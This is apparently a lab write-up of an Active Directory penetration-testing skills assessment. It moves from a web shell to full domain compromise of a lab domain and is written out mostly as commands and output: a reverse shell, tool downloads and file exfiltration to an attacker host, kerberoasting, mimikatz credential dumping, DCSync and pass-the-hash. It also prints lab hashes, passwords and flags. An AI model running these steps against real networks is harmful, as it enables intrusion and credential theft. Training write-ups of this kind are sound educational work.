# AD Enumeration & Attacks - Skills Assessment Part I

## Scenario

>A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

## 10.129.182.185 WEB-WIN01

### Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.129.182.185             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-02 06:14 EDT
Nmap scan report for 10.129.182.185
Host is up (0.48s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m27s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-02T10:17:37
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   950.79 ms 10.10.14.1
2   951.26 ms 10.129.182.185

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.35 seconds
```

### Initial Access

Go to `/uploads` and find `antak.aspx` as the description says and use the credentials.

![](assets/Pasted%20image%2020250502123059.png)

Put a powershell reverse shell to a listener to have a better shell.

```shell
$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.216] from (UNKNOWN) [10.129.182.185] 49707

PS C:\windows\system32\inetsrv> whoami
nt authority\system
PS C:\windows\system32\inetsrv>
```

### Post Exploitation

Get the local flag.

```powershell
PS C:\users\administrator\desktop> type flag.txt
JusT_g3tt1ng_st@rt3d!
PS C:\users\administrator\desktop>
```

Upload SharpHound.exe and collect AD info, then using a share, download it.

```shell
PS C:\users\administrator> iwr -uri http://10.10.14.216:4444/SharpHound.exe -outfile sh.exe
PS C:\users\administrator> .\sh.exe -c All
```

```shell
$ impacket-smbserver -smb2support kali -username test -password test .
```

```powershell
PS C:\users\administrator> net use Z: \\10.10.14.216\kali /u:test 'test'
The command completed successfully.

PS C:\users\administrator> cp 20250502045305_BloodHound.zip z:
```

Upload Rubeus.exe and perform a kerberoasting attack.

```powershell
PS C:\> .\rubeus.exe kerberoast /simple /outfile:hashes.txt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 7

[*] Roasted hashes written to : C:\hashes.txt
```

Use hashcat to crack the hashes.

```shell
$ hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt --force                            
hashcat (v6.2.6) starting

...

$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$62dc38899e3aa65424166f8a757caef0$b0d8a7f29aad3f964825596977516096879b96850b8183459990b00d6efdc4ce2b8b7d1696056c4c8b95a12fb4bb12ca87cd693c3a83b02415421e57505973d3a9ce1dad33cb7d3de301fe0e426fc9b3924160de0fe4898034ef2f35042a1393db3c46b30ed60ab4cf2445ee63a405c885c78ac9d1bb06e42bb0526e8442a65694735dc42f8a441f2bc0817b4b8102f79544f7111a328010358686d664e108c7d02d414b56d0985d0e67eb22c8b54a1f0d1f5a4ce9673008a2cd421727f6dfef5c013ce2003d1bc72a58d662394100d43951e6e91100920d1245c5830a1066c25e2a04ca19f0d2ec3e288bcbb28c34eeaaa8812d49678322a4d445e8a7d029b6c000c79bdd0b489c0236c6f6487085498f76b0d856601f2762f2c70e748964b7f490a9922fb57d87f057c2ecab44f00fd772a48262c51081e24b1ed434261e96c7c3ae0884d451585f6b50a777fb0067dcd58efc0c1f60c5804546755e8a2f44446fb3f5fb0bef924bfd0426e2bdec6706078f3498b79502808b2aee57dacd19ed7edcb9b8430d86ff0a1b504f9a3c9a4077214a00922f0adeab279c19cd1c30272beb88437690234a04b36ec1d4b614ed08b7db95de4b6bf7a8efcaf5145d2e1f9c937c90d398f5e54867cd27707e5d29e6558bc26952fed5aa0803569f8ed0769e536bfb72f339ccd92868631bb43de3e1d4012d8495c822825e18901b2c0e5ddfb65820930757bcf7ecb6fd4bd79d67895e1b2d41f561d67d588569c5791119ce24e9f351256c09a48912e5a4a200aa7272e51bb41fa27a636d692a510c2a7f5a26dc399742b54449042a9da0dd8d5eedd9d0644a282517bafdd61c67ec83dfda1e8ceb391faa88384cb5451e63759d7b64bec22c833b38e7cc326b54f660b8a43ea364e307badfd993d03d9c8a88cee2629e9050f23d30a8cbaf798a74c6b4f45f9c77e252e100f1e7b010cc4b739144c740b7c07e6ab0d545ba29b61575be4a439b70d37b829b30f8b932843f4c5ca71344af78df32c1b10105547f2aad50eb917a412c806ae36dd9dcbcf7cfc81553e0e990c1fc7e6140c02bb622cfe2faf725ae6487bac14d25cee5e2604fea09fb4b289da9f6207ba03aff3fc36d50df20ac035f30c41c2598b765aae0c560363d21ffb28932b7194107684c7ca671e70b1bfd16df82a42d6dcc82534fc9a6c6ff93015c5b0400a790d89c8a53d8a40db09991bffb028cf621f27bb81dc6bd7f0fd23bfab2206607e0e1bec94f96136817aad2d7a4a996327f1438b570206c3219414ecd93093d87d8ce3eedbfeb292b6fece1674eacdd9d41e99b795faad0c8bb4e2d9a36936b0542a083abfd718331f1553933ee76b250bfa57d6c4d796b5a00803f9895d6ded23322bf7d5342f1985f0dff749dc9e684253779a29033f8af1ec73342e9a59cab18e6a553481cd545a3dbcec725637ea74cdbe81db7bbdc60ce8225bbb95226bcee68032888cc626d07c50ae80dd38e93abbd79d5d7e71ce574377caf2dd864:lucky7
```

`svc_sql:lucky7`

There is another network adapter.

```powershell
PS C:\windows\system32\inetsrv> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::2d19:6dc7:1525:2455%7
   IPv4 Address. . . . . . . . . . . : 172.16.6.100
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.6.1

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::e13e:a8c5:1188:4d9a
   Link-local IPv6 Address . . . . . : fe80::e13e:a8c5:1188:4d9a%3
   IPv4 Address. . . . . . . . . . . : 10.129.182.185
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:ac3b%3
                                       10.129.0.1
```

Upload ligolo and establish a tunnel.

```shell
$ ./ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

```powershell
PS C:\users\administrator> .\ligolo.exe -connect 10.10.14.216:443 -ignore-cert
```

```shell
INFO[0271] Agent joined.                                 id=005056944a6b name="NT AUTHORITY\\SYSTEM@WEB-WIN01" remote="10.129.182.185:49758"
ligolo-ng » session
? Specify a session : 1 - NT AUTHORITY\SYSTEM@WEB-WIN01 - 10.129.182.185:49758 - 005056944a6b
[Agent : NT AUTHORITY\SYSTEM@WEB-WIN01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:94:4a:6b              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv6 Address │ fe80::2d19:6dc7:1525:2455/64   │
│ IPv4 Address │ 172.16.6.100/16                │
└──────────────┴────────────────────────────────┘
```

```shell
$ sudo ip route add 172.16.6.0/24 dev ligolo
```

```
[Agent : NT AUTHORITY\SYSTEM@WEB-WIN01] » start
INFO[0429] Starting tunnel to NT AUTHORITY\SYSTEM@WEB-WIN01 (005056944a6b) 
```

Perform a ping sweep to discover more hosts.

```shell
$ fping -a -g 172.16.6.1 172.16.6.254 2>/dev/null        
172.16.6.3
172.16.6.50
172.16.6.100
```

Check credentials against the two new hosts

```shell
$ nxc smb 172.16.6.50 -u svc_sql -p lucky7
SMB         172.16.6.50     445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
    
$ nxc smb 172.16.6.3 -u svc_sql -p lucky7
SMB         172.16.6.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.6.3      445    DC01  [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 

$ nxc winrm 172.16.6.50 -u svc_sql -p lucky7
WINRM       172.16.6.50     5985   MS01             [*] Windows 10 / Server 2019 Build 17763 (name:MS01) (domain:INLANEFREIGHT.LOCAL)
WINRM       172.16.6.50     5985   MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
```

## 172.16.6.50 MS01

### Enumeration

```shell
$ nmap --top-ports 100 -sT -Pn --open 172.16.6.50
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-02 07:47 EDT
Nmap scan report for 172.16.6.50
Host is up (0.079s latency).
Not shown: 96 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
```

### Initial Access

Using credentials found via kerberoasting

```shell
$ evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7                                    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                       
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_sql.INLANEFREIGHT\Documents> whoami
inlanefreight\svc_sql
*Evil-WinRM* PS C:\Users\svc_sql.INLANEFREIGHT\Documents> 
```

## Privilege Escalation

Get the flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type flag.txt
spn$_r0ast1ng_on_@n_0p3n_f1re
```


Upload mimikatz.exe and extract hashes

```powershell
*Evil-WinRM* PS C:\Users\Administrator\desktop> upload mimikatz.exe 
Info: Upload successful!

*Evil-WinRM* PS C:\Users\Administrator\desktop> .\mimikatz.exe "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::logonpasswords

...

Authentication Id : 0 ; 233089 (00000000:00038e81)
Session           : Interactive from 1
User Name         : tpetty
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 5/2/2025 8:54:12 AM
SID               : S-1-5-21-2270287766-1317258649-2146029398-4607
        msv :
         [00000003] Primary
         * Username : tpetty
         * Domain   : INLANEFREIGHT
         * NTLM     : fd37b6fec5704cadabb319cebf9e3a3a
         * SHA1     : 38afea42a5e28220474839558f073979645a1192
         * DPAPI    : da2ec07551ab1602b7468db08b41e3b2
        tspkg :
        wdigest :
         * Username : tpetty
         * Domain   : INLANEFREIGHT
```

User tpetty can DCSync the domain

![](assets/Pasted%20image%2020250502164144.png)

Using secretsdump

```shell
$ impacket-secretsdump inlanefreight.local/tpetty@172.16.6.3 -hashes :fd37b6fec5704cadabb319cebf9e3a3a -dc-ip 172.16.6.3 -just-dc-user administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
Administrator:aes128-cts-hmac-sha1-96:69e27df2550c5c270eca1d8ce5c46230
Administrator:des-cbc-md5:c2d9c892f2e6f2dc
[*] Cleaning up...
```

## 172.16.6.3 DC01

### Enumeration

```shell
$ nmap --top-ports 100 -sT -Pn --open 172.16.6.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-02 07:47 EDT
Nmap scan report for 172.16.6.3
Host is up (0.24s latency).
Not shown: 94 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos-sec
135/tcp open  msrpc
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 37.51 seconds
```

### Initial Access

Using evil-winrm with administrator's credentials from DCSync attack.

```shell
$ evil-winrm -i 172.16.6.3 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
inlanefreight\administrator
```

### Post Exploitation

Get the flag

```shell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type flag.txt
r3plicat1on_m@st3r!
```